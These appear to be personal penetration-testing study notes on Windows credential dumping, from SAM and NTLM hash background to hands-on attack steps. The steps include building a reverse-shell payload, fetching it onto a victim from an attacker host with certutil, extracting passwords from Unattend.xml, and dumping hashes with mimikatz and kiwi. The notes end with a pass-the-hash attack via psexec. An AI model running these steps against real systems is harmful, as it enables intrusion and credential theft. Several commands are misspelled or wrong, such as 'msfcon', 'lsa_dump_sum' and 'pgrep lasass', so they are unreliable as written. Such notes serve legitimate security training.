# Windows Credential Dumping 
### Windows Password Hashes
- stored locally in the SAM (Security Accounts Manager) database
- authentication and verification of user credentials is facilitated by the Local Security Authority(LSA)
- NTLM hashing format
- SAM Database
	- responsible for managing user accounts and passwords
	- cannot be copied while the OS is running
	- Windows NT kernel keeps the SAM file locked
	- SAM hashes can be  dumped from the LSASS process
	- modern versions of windows, SAM DB is encrypted with a syskey
	- Elevated/Administrative privileges are required to access and interact with the LSASS process
- LM 
	- LanMan hashing algorithm
	- was implemented on windows OS
	- does not include salts
	- weak and outdated
- NTLM
	- NTHash
	- from windows vista onward
	- case sensitive
	- does not split the hash into two chunks
	- allows the user of symbols the Unicode characters
	- MD4 algorithm

### Searching for Passwords in Windows Configuration Files
- Unattended Windows Setup utily
- can be found 
	- C:\Windows\Panther\Unattend.xml
	- C:\Windows\Panther\Autounattend.xml
	- passwords stored by base64
- approach example
	- `$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe > payload.exe`
	- `$ python -m SimpleHTTPServer 80 - hosting web server`
	- download the payload on the victim computer
	- open cmd
	- `cd Desktot\`
	- `certutil -urlcache -f http://yourip/payload.exe payload.exe`
	- shut down the web server
	- `$ service postgresql start && msfcon`
	- `$ use multi/handler`
	- configure the options
	- `run`
	- execute the payload on target sys
	- `$ sysinfo`
	- `$ cd C:\\`
	- `$ cd Panther`
	- `$ dir`
	- `$ download unattend.xml`
	- decode the password
	- `base64 -d password.txt`
	- `psexec.py Administrator@10.10.10.10`

### Dumping Hashes with Mimikatz
- Mimikatz	
	- Post-exploitation tool
	- extraction of clear-text passwords, hashes and Kerberos tickets from memory
	- from lsass.exe process
	- require elevated privileges to run correctly
- process
	- Nmap scan to find potentially vulnerable services
	- `$ service postgresql start && msfcon`
	- `$ search badblue`
	- `$ use 1`
	- configure options and run
	- `$ getuid`
	- `$ pgrep lasass`
	- `$ migrate`
	- `$ load kiwi` - build-in meterpreter module
	- `$ ?`
	- `$ lsa_dump_sum`
	- `$ lsa_dump_secrets`
	- using mimiktz
		- upload the mimikatz.exe to your target system
		- run mimikatz
		- `$ privilege::debug`
		- if answer was 20 ok, you have the required privileges
		- `$ lsadump::sam`
		- `$ lsadump::secrets`
		- `$ sekurlsa::logonpasswords`
### Pass-The-Hash Attacks
- Exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and using them to authenticate with the target legitimately
- tools
	- Metasploit PsExec module
	- Crackmapexec
- process
	- after gaining the hashes with kiwi
	- you need the LM hash - hashdump - LMhash:NTLMhash
	- `Search psexec`
	- `use 9`
	- `show options LPORT, RHOSTS, SMBUSER, SMBPass`
	- `set target Native\upload`
	- `exploit`
